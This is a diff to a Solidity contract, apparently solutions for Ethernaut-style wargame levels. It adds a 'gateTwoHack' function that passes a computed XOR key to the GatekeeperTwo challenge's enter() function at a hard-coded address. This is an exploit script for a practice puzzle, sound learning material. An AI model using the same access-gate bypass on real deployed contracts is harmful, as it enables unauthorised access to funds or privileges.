@@ -113,6 +113,14 @@ contract Building {
       //24.573
   }
 
+  //GateKeeperTwo the function should be a constructor
+  function gateTwoHack() public {
+      address gateTwo = 0xEe8a8b56Fec5d2cF79D66D3520E3c9fF6E613FD3;
+      address payable addrP = payable(gateTwo);
+      (bool result, ) = addrP.call(abi.encodeWithSignature("enter(bytes8)", 
+      bytes8(uint64(18446744073709551615) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))))));
+      require(result);
+  }
   // to support receiving ETH by default
   receive() external payable {
     //revert("youcan't"); for king
